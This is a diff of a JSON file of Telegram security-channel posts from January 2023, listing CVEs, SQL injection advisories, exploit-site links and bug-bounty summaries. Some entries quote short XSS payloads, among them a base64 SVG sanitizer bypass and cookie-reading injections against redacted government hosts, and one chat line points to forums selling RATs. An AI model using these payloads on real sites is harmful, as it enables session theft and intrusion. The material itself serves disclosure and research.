@@ -1,5 +1,5 @@
 {
-    "date": "2023-01-31",
+    "date": "2023-02-14",
     "from_channel": "cibsecurity",
     "message": "‼ CVE-2022-45297 ‼\n\nEQ v1.5.31 to v2.2.0 was discovered to contain a SQL injection vulnerability via the UserPwd parameter.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
@@ -17,7 +17,6 @@
     "date": "2023-01-31",
     "from_channel": "defcon_news",
     "message": "Hikvision Remote Code Execution / XSS / SQL Injection\nhttp://exploit.kitploit.com/2023/01/hikvision-remote-code-execution-xss-sql.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/hikvision-remote-code-execution-xss-sql.html"
 }
@@ -90,7 +89,6 @@
     "date": "2023-01-30",
     "from_channel": "defcon_news",
     "message": "PHPJabbers Travel Tours Script 1.0 SQL Injection\nhttp://exploit.kitploit.com/2023/01/phpjabbers-travel-tours-script-10-sql.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/phpjabbers-travel-tours-script-10-sql.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -98,7 +96,6 @@
     "date": "2023-01-30",
     "from_channel": "defcon_news",
     "message": "PHPJabbers Property Listing Script 3.1 SQL Injection\nhttp://exploit.kitploit.com/2023/01/phpjabbers-property-listing-script-31_30.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/phpjabbers-property-listing-script-31_30.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -106,7 +103,6 @@
     "date": "2023-01-30",
     "from_channel": "defcon_news",
     "message": "PHPJabbers Travel Tours Script 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/170780/phpjabberstts10-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170780/phpjabberstts10-sql.txt"
 }
@@ -114,7 +110,6 @@
     "date": "2023-01-30",
     "from_channel": "defcon_news",
     "message": "PHPJabbers Property Listing Script 3.1 SQL Injection\nhttps://packetstormsecurity.com/files/170776/phpjabberspls31-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170776/phpjabberspls31-sql.txt"
 }
@@ -180,12 +175,11 @@
     "date": "2023-01-29",
     "from_channel": "defcon_news",
     "message": "Internet Bug Bounty: Rails ActionView sanitize helper bypass leading to XSS using SVG tag.\nhttps://vulners.com/hackerone/H1:1805873?utm_source=rss&utm_medium=rss&utm_campaign=rss",
-    "urls": [],
     "webpage_description": "In the specific configuration, it was possible to bypass HTML sanitization by using the use tag of the SVG element. In the index.html.erb: ruby <%= sanitize \"<svg><use href=\\\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\\\"/></svg>\", tags: %w(svg use) %> use tag allows to embed another base64 encoded SVG containing target XSS payload, base64 after decoding: svg <svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='1337' height='1337'> <image href=\"1\" onerror=\"alert(window.origin)\" /> </svg> SVG and use tags had to be allowed either in global configuration  config.action_view.sanitized_allowed_tags = ['svg', 'use'] or inline with tags argument of the helper. Impact XSS could lead to data theft through the attacker’s ability to manipulate data through their access…",
     "webpage_url": "https://vulners.com/hackerone/H1:1805873?utm_source=rss&utm_medium=rss&utm_campaign=rss"
 }
 {
-    "date": "2023-01-29",
+    "date": "2023-02-01",
     "from_channel": "hackgit",
     "message": "​​mybb_1832_LFI_RCE\n\nMyBB 1.8.32 - Chained LFI Remote Code Execution (RCE) (Authenticated) python exploit script...\n\nhttps://github.com/FDlucifer/mybb_1832_LFI_RCE",
     "webpage_url": "https://telegra.ph/file/33402217531fc12dd74d0.jpg"
@@ -201,7 +195,7 @@
     "message": "‼ CVE-2023-0562 ‼\n\nA vulnerability was found in PHPGurukul Bank Locker Management System 1.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file index.php of the component Login. The manipulation of the argument username leads to sql injection. The attack may be launched remotely. The identifier of this vulnerability is VDB-219716.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
 }
 {
-    "date": "2023-01-28",
+    "date": "2023-02-06",
     "from_channel": "hackgit",
     "message": "​​jsoup\n\nThe Java HTML parser, built for HTML editing, cleaning, scraping, and XSS safety.\n\njsoup is a Java library for working with real-world HTML. It provides a very convenient API for fetching URLs and extracting and manipulating data, using the best of HTML5 DOM methods and CSS selectors.\n\nhttps://github.com/jhy/jsoup",
     "webpage_url": "https://telegra.ph/file/f6cfdeb6b5fea573fa5e5.jpg"
@@ -230,7 +224,6 @@
     "date": "2023-01-27",
     "from_channel": "defcon_news",
     "message": "U.S. Dept Of Defense: XSS on ( █████████.gov ) Via URL path\nhttps://vulners.com/hackerone/H1:1825942?utm_source=rss&utm_medium=rss&utm_campaign=rss",
-    "urls": [],
     "webpage_description": "Hi team, I was able to execute XSS on   ███████.gov   Steps to produce -  1 -Turn on the burp intercepter  2- Go to  https:// ██████.gov/xapi/statements?file\">alert(document.domain) 3-  In  Intercepter add the following Headers  Authorization: Basic eGFwaS10b29sczp4YXBpLXRvb2xz    X-Experience-Api-Version: 1.0.1 4-  when you send this GET request you will receive a response with XSS payload executed. Impact An attacker can send the malicious link to victims and steals victims' cookie leading to account takeover. System Host(s) www. ███.gov Affected Product(s) and Version(s) CVE Numbers CVE-2021-41878 Steps to Reproduce I have attached the Video POC, please check it out. Suggested Mitigation/Remediation Actions sanitize the inputs in the...",
     "webpage_url": "https://vulners.com/hackerone/H1:1825942?utm_source=rss&utm_medium=rss&utm_campaign=rss"
 }
@@ -238,7 +231,6 @@
     "date": "2023-01-27",
     "from_channel": "defcon_news",
     "message": "U.S. Dept Of Defense: reflected xss in www.████████.gov\nhttps://vulners.com/hackerone/H1:1814335?utm_source=rss&utm_medium=rss&utm_campaign=rss",
-    "urls": [],
     "webpage_description": "It was observed that the application is vulnerable to cross-site scripting (XSS). XSS is a type of attack that involves running a malicious scripts on a victim’s browser. poc attached payload: ryp3i%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fopk15 Parameter: prefixRank request: ``` POST /ioss/site/customer.cfm?oHvIaPEiVgj7Hf9Ux5T+eNZwuEg2J/n12v1EZMCIm2I= HTTP/1.1 Host: www. ████.gov Cookie: CFID=37933027; CFTOKEN=51767030; JSESSIONID=1A3418B42833E571ACD8B2EA991592C4.cfusion; __utma=90160643.185474856.1671578010.1671578010.1671578010.1; __utmc=90160643; __utmz=90160643.1671578010.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt_GSA_CP=1; __utmb=90160643.10.10.1671578010 Content-Length: 628 Cache-Control: max-age=0 Sec-Ch-Ua: \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"Windows\" Upgrade-Insecure-Requests: 1 Origin: https://www. ██████████.gov Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;…",
     "webpage_url": "https://vulners.com/hackerone/H1:1814335?utm_source=rss&utm_medium=rss&utm_campaign=rss"
 }
@@ -246,7 +238,6 @@
     "date": "2023-01-27",
     "from_channel": "defcon_news",
     "message": "U.S. Dept Of Defense: Reflected XSS on ██████.mil\nhttps://vulners.com/hackerone/H1:1799562?utm_source=rss&utm_medium=rss&utm_campaign=rss",
-    "urls": [],
     "webpage_description": "Description: While looking for *.mil, I found a website that is vulnerable to reflected XSS. Impact An attacker can use it to fetch cookies/tokens from any website which requires login by using a CORS bug if the site is vulnerable to CORS. System Host(s)  ████.mil Affected Product(s) and Version(s) CVE Numbers Steps to Reproduce  Go to this URL: https:// ███████████████████html On the search bar, write this payload. alert(document.cookie) & you'll see the pop-up.  Suggested Mitigation/Remediation...",
     "webpage_url": "https://vulners.com/hackerone/H1:1799562?utm_source=rss&utm_medium=rss&utm_campaign=rss"
 }
@@ -279,7 +270,6 @@
     "date": "2023-01-27",
     "from_channel": "defcon_news",
     "message": "PHPJabbers Car Rental Script 3.0 SQL Injection\nhttp://exploit.kitploit.com/2023/01/phpjabbers-car-rental-script-30-sql.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/phpjabbers-car-rental-script-30-sql.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -322,7 +312,6 @@
     "date": "2023-01-27",
     "from_channel": "defcon_news",
     "message": "PHPJabbers Car Rental Script 3.0 SQL Injection\nhttps://packetstormsecurity.com/files/170763/carrentalscript30-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170763/carrentalscript30-sql.txt"
 }
@@ -415,7 +404,6 @@
     "date": "2023-01-26",
     "from_channel": "defcon_news",
     "message": "Bypassing Cloudflare WAF: XSS via SQL Injection\nhttps://www.reddit.com/r/netsec/comments/10kgr8y/bypassing_cloudflare_waf_xss_via_sql_injection/",
-    "urls": [],
     "webpage_description": "Posted in the netsec community.",
     "webpage_url": "https://www.reddit.com/r/netsec/comments/10kgr8y/bypassing_cloudflare_waf_xss_via_sql_injection/"
 }
@@ -423,12 +411,11 @@
     "date": "2023-01-26",
     "from_channel": "defcon_news",
     "message": "Exploiting a Critical Spoofing Vulnerability in Windows CryptoAPI\nhttps://www.reddit.com/r/netsec/comments/10lt654/exploiting_a_critical_spoofing_vulnerability_in/",
-    "urls": [],
     "webpage_description": "Posted in the netsec community.",
     "webpage_url": "https://www.reddit.com/r/netsec/comments/10lt654/exploiting_a_critical_spoofing_vulnerability_in/"
 }
 {
-    "date": "2023-01-26",
+    "date": "2023-01-29",
     "from_channel": "hackgit",
     "message": "​​CVE-2022-34689\n\nCryptoAPI spoofing vulnerability\n\nThe repository contains code for two types of PoCs: one exploiting Chrome v48 and another focusing on the vulnerable MD5 check in crypt32.dll.\n\nhttps://github.com/akamai/akamai-security-research/tree/main/PoCs/CVE-2022-34689\n\nDetails:\nhttps://www.akamai.com/blog/security-research/exploiting-critical-spoofing-vulnerability-microsoft-cryptoapi\n\n#cve #poc",
     "webpage_url": "https://telegra.ph/file/98980b7776932e1112be9.mp4"
@@ -439,7 +426,7 @@
     "message": "CVE-2022-34689\n\nWindows CryptoAPI spoofing vulnerability.\n\nДырку в сыре обнаружили АНБ и NCSC Великобритании, она позволяет подделывать сертификаты коллизии MD5 и вообще манипуляции с сертификатом x.509. \n\nExploit\n\n#windows #x509"
 }
 {
-    "date": "2023-01-26",
+    "date": "2023-01-27",
     "from_channel": "hackgit",
     "message": "​​CVE-2022-47966 Scanner\n\nCVE-2022-47966 is a critical unauthenticated remote code execution vulnerability affecting at least 24 on-premise ManageEngine products. The vulnerability applies only if SAML SSO is enabled. For some products it also applies if SAML SSO was previously enabled.\n\nhttps://github.com/vonahisec/CVE-2022-47966-Scan\n\n#cve",
     "webpage_url": "https://telegra.ph/file/4462ceab224584060d3a4.jpg"
@@ -448,7 +435,6 @@
     "date": "2023-01-26",
     "from_channel": "sysadm_in_channel",
     "message": "/ Exploiting a Critical Spoofing Vulnerability in Windows CryptoAPI\n\nhttps://www.akamai.com/blog/security-research/exploiting-critical-spoofing-vulnerability-microsoft-cryptoapi",
-    "urls": [],
     "webpage_description": "Akamai researchers have analyzed a critical vulnerability in Microsoft's CryptoAPI that would allow an attacker to masquerade as a legitimate entity.",
     "webpage_url": "https://www.akamai.com/blog/security-research/exploiting-critical-spoofing-vulnerability-microsoft-cryptoapi"
 }
@@ -456,7 +442,6 @@
     "date": "2023-01-25",
     "from_channel": "defcon_news",
     "message": "Inout Jobs Portal 2.2.2 SQL Injection\nhttp://exploit.kitploit.com/2023/01/inout-jobs-portal-222-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/inout-jobs-portal-222-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -464,7 +449,6 @@
     "date": "2023-01-25",
     "from_channel": "defcon_news",
     "message": "Inout Music 5.1.1 SQL Injection\nhttp://exploit.kitploit.com/2023/01/inout-music-511-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/inout-music-511-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -472,7 +456,6 @@
     "date": "2023-01-25",
     "from_channel": "defcon_news",
     "message": "Inout Jobs Portal 2.2.2 SQL Injection\nhttps://packetstormsecurity.com/files/170735/inoutjobsportal222-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170735/inoutjobsportal222-sql.txt"
 }
@@ -480,7 +463,6 @@
     "date": "2023-01-25",
     "from_channel": "defcon_news",
     "message": "Inout Music 5.1.1 SQL Injection\nhttps://packetstormsecurity.com/files/170734/inoutmusic511-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170734/inoutmusic511-sql.txt"
 }
@@ -493,14 +475,12 @@
     "date": "2023-01-25",
     "from_channel": "sysadm_in_channel",
     "message": "/ VMware vRealize Log Insight Directory Traversal Vulnerability \n\nhttps://www.vmware.com/security/advisories/VMSA-2023-0001.html",
-    "urls": [],
     "webpage_url": "https://www.vmware.com/security/advisories/VMSA-2023-0001.html"
 }
 {
     "date": "2023-01-24",
     "from_channel": "defcon_news",
     "message": "Inout Homestay 2.2 SQL Injection\nhttp://exploit.kitploit.com/2023/01/inout-homestay-22-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/inout-homestay-22-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -508,15 +488,13 @@
     "date": "2023-01-24",
     "from_channel": "defcon_news",
     "message": "Inout Homestay 2.2 SQL Injection\nhttps://packetstormsecurity.com/files/170712/inouthomestay22-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170712/inouthomestay22-sql.txt"
 }
 {
     "date": "2023-01-24",
     "from_channel": "ctfchat",
-    "message": "хотите ратник - идите на xss / сплойт ины и на снг форумы типа лолза",
-    "urls": []
+    "message": "хотите ратник - идите на xss / сплойт ины и на снг форумы типа лолза"
 }
 {
     "date": "2023-01-24",
@@ -582,7 +560,6 @@
     "date": "2023-01-23",
     "from_channel": "defcon_news",
     "message": "ERPGo SaaS 3.9 CSV Injection\nhttp://exploit.kitploit.com/2023/01/erpgo-saas-39-csv-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/erpgo-saas-39-csv-injection.html"
 }
@@ -590,7 +567,6 @@
     "date": "2023-01-23",
     "from_channel": "defcon_news",
     "message": "Inout RealEstate 2.1.3 SQL Injection\nhttp://exploit.kitploit.com/2023/01/inout-realestate-213-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/inout-realestate-213-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -598,7 +574,6 @@
     "date": "2023-01-23",
     "from_channel": "defcon_news",
     "message": "ERPGo SaaS 3.9 CSV Injection\nhttps://packetstormsecurity.com/files/170640/erpgosaas39-csvinject.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170640/erpgosaas39-csvinject.txt"
 }
@@ -606,7 +581,6 @@
     "date": "2023-01-23",
     "from_channel": "defcon_news",
     "message": "Inout RealEstate 2.1.3 SQL Injection\nhttps://packetstormsecurity.com/files/170637/inoutrealestate213-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170637/inoutrealestate213-sql.txt"
 }
@@ -614,7 +588,6 @@
     "date": "2023-01-23",
     "from_channel": "defcon_news",
     "message": "SQLiDetector - Helps You To Detect SQL Injection \"Error Based\" By Sending Multiple Requests With 14 Payloads And Checking For 152 Regex Patterns For Different Databases\nhttp://www.kitploit.com/2023/01/sqlidetector-helps-you-to-detect-sql.html",
-    "urls": [],
     "webpage_url": "https://www.kitploit.com/2023/01/sqlidetector-helps-you-to-detect-sql.html"
 }
 {
@@ -686,7 +659,6 @@
     "date": "2023-01-20",
     "from_channel": "defcon_news",
     "message": "OpenText Extended ECM 22.3 File Deletion / LFI / Privilege Escsalation\nhttp://exploit.kitploit.com/2023/01/opentext-extended-ecm-223-file-deletion.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/opentext-extended-ecm-223-file-deletion.html"
 }
@@ -694,7 +666,6 @@
     "date": "2023-01-20",
     "from_channel": "defcon_news",
     "message": "Inout Multi-Vendor Shopping Cart 3.2.3 SQL Injection\nhttp://exploit.kitploit.com/2023/01/inout-multi-vendor-shopping-cart-323_20.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/inout-multi-vendor-shopping-cart-323_20.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -702,7 +673,6 @@
     "date": "2023-01-20",
     "from_channel": "defcon_news",
     "message": "OpenText Extended ECM 22.3 File Deletion / LFI / Privilege Escsalation\nhttps://packetstormsecurity.com/files/170615/SA-20230117-2.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170615/SA-20230117-2.txt"
 }
@@ -710,7 +680,6 @@
     "date": "2023-01-20",
     "from_channel": "defcon_news",
     "message": "Inout Multi-Vendor Shopping Cart 3.2.3 SQL Injection\nhttps://packetstormsecurity.com/files/170607/inoutmvsc323-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170607/inoutmvsc323-sql.txt"
 }
@@ -728,7 +697,6 @@
     "date": "2023-01-20",
     "from_channel": "defcon_news",
     "message": "Ghauri - An Advanced Cross-Platform Tool That Automates The Process Of Detecting And Exploiting SQL Injection Security Flaws\nhttp://www.kitploit.com/2023/01/ghauri-advanced-cross-platform-tool.html",
-    "urls": [],
     "webpage_url": "https://www.kitploit.com/2023/01/ghauri-advanced-cross-platform-tool.html"
 }
 {
@@ -739,8 +707,7 @@
 {
     "date": "2023-01-20",
     "from_channel": "ctfchat",
-    "message": "привет! помнишь меня? я твой эйчар. и вот твое тестовое - опиши как работает xss",
-    "urls": []
+    "message": "привет! помнишь меня? я твой эйчар. и вот твое тестовое - опиши как работает xss"
 }
 {
     "date": "2023-01-20",
@@ -766,7 +733,6 @@
     "date": "2023-01-20",
     "from_channel": "sysadm_in_channel",
     "message": "/ Client-Side SSRF to Google Cloud Project Takeover [Google VRP]\n\nhttps://blog.geekycat.in/client-side-ssrf-to-google-cloud-project-takeover/",
-    "urls": [],
     "webpage_description": "This write-up is a part of a series of write-ups about the bugs I and Sivanesh found in Google Cloud in 2022.\n\nGoogle Cloud offers Vertex AI, which lets you build, deploy and scale machine learning models. In addition to various other features, Vertex AI also provides a \" Workbench \" feature.",
     "webpage_url": "https://blog.geekycat.in/client-side-ssrf-to-google-cloud-project-takeover/"
 }
@@ -854,7 +820,6 @@
     "date": "2023-01-18",
     "from_channel": "defcon_news",
     "message": "Active eCommerce CMS 6.5.0 SQL Injection\nhttp://exploit.kitploit.com/2023/01/active-ecommerce-cms-650-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/active-ecommerce-cms-650-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -862,7 +827,6 @@
     "date": "2023-01-18",
     "from_channel": "defcon_news",
     "message": "PHP Hazir Haber Sitesi Scripti 3 SQL Injection\nhttp://exploit.kitploit.com/2023/01/php-hazir-haber-sitesi-scripti-3-sql.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/php-hazir-haber-sitesi-scripti-3-sql.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -870,7 +834,6 @@
     "date": "2023-01-18",
     "from_channel": "defcon_news",
     "message": "Active Matrimonial CMS 3.6 SQL Injection\nhttp://exploit.kitploit.com/2023/01/active-matrimonial-cms-36-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/active-matrimonial-cms-36-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -878,7 +841,6 @@
     "date": "2023-01-18",
     "from_channel": "defcon_news",
     "message": "Yazilimi Jettweb Haber 3 SQL Injection\nhttp://exploit.kitploit.com/2023/01/yazilimi-jettweb-haber-3-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/yazilimi-jettweb-haber-3-sql-injection.html"
 }
@@ -886,7 +848,6 @@
     "date": "2023-01-18",
     "from_channel": "defcon_news",
     "message": "Active eCommerce CMS 6.5.0 SQL Injection\nhttps://packetstormsecurity.com/files/170579/activeecommercecms650-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170579/activeecommercecms650-sql.txt"
 }
@@ -894,7 +855,6 @@
     "date": "2023-01-18",
     "from_channel": "defcon_news",
     "message": "PHP Hazir Haber Sitesi Scripti 3 SQL Injection\nhttps://packetstormsecurity.com/files/170575/jettweb3-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170575/jettweb3-sql.txt"
 }
@@ -902,7 +862,6 @@
     "date": "2023-01-18",
     "from_channel": "defcon_news",
     "message": "Active Matrimonial CMS 3.6 SQL Injection\nhttps://packetstormsecurity.com/files/170565/activematrimonialcms36-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170565/activematrimonialcms36-sql.txt"
 }
@@ -910,7 +869,6 @@
     "date": "2023-01-18",
     "from_channel": "defcon_news",
     "message": "Yazilimi Jettweb Haber 3 SQL Injection\nhttps://packetstormsecurity.com/files/170559/yjh3-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170559/yjh3-sql.txt"
 }
@@ -938,7 +896,6 @@
     "date": "2023-01-18",
     "from_channel": "defcon_news",
     "message": "Four Azure Services Vulnerable To SSRF Flaws\nhttps://packetstormsecurity.com/news/view/34229/Four-Azure-Services-Vulnerable-To-SSRF-Flaws.html",
-    "urls": [],
     "webpage_description": "The vulnerable services include Azure API Management, Azure Functions, Azure Machine Learning, and Azure Digitals, according to a blog post Tuesday by Orca Security. Among them, two vulnerabilities involving Azure Functions and Azure Digital Twins did not require authentication, meaning that an attacker could exploit them even without an Azure account.  ",
     "webpage_url": "https://packetstormsecurity.com/news/view/34229/Four-Azure-Services-Vulnerable-To-SSRF-Flaws.html"
 }
@@ -1046,7 +1003,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "BootCommerce 3.2.1 SQL Injection\nhttp://exploit.kitploit.com/2023/01/bootcommerce-321-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/bootcommerce-321-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -1054,7 +1010,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "Infobool 3.0 SQL Injection\nhttp://exploit.kitploit.com/2023/01/infobool-30-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/infobool-30-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -1062,7 +1017,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "Global Infotech CMS 1.0 SQL Injection\nhttp://exploit.kitploit.com/2023/01/global-infotech-cms-10-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/global-infotech-cms-10-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -1070,7 +1024,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "Infokart 1.1 SQL Injection\nhttp://exploit.kitploit.com/2023/01/infokart-11-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/infokart-11-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -1078,7 +1031,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "Yuvan Education CRM 3.0 SQL Injection\nhttp://exploit.kitploit.com/2023/01/yuvan-education-crm-30-sql-injection.html",
-    "urls": [],
     "webpage_description": "Exploit Collector is the ultimate collection of public exploits and exploitable vulnerabilities. Remote/Local Exploits, Shellcode and 0days.",
     "webpage_url": "https://exploit.kitploit.com/2023/01/yuvan-education-crm-30-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
@@ -1086,7 +1038,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "BootCommerce 3.2.1 SQL Injection\nhttps://packetstormsecurity.com/files/170545/bootcommerce321-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170545/bootcommerce321-sql.txt"
 }
@@ -1094,7 +1045,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "Infobool 3.0 SQL Injection\nhttps://packetstormsecurity.com/files/170533/infobool30-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170533/infobool30-sql.txt"
 }
@@ -1102,7 +1052,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "Global Infotech CMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/170529/gic10-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
     "webpage_url": "https://packetstormsecurity.com/files/170529/gic10-sql.txt"
 }
@@ -1110,7 +1059,6 @@
     "date": "2023-01-17",
     "from_channel": "defcon_news",
     "message": "Infokart 1.1 SQL Injection\nhttps://packetstormsecurity.com/files/170532/infokart11-sql.txt",
-    "urls": [],
     "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
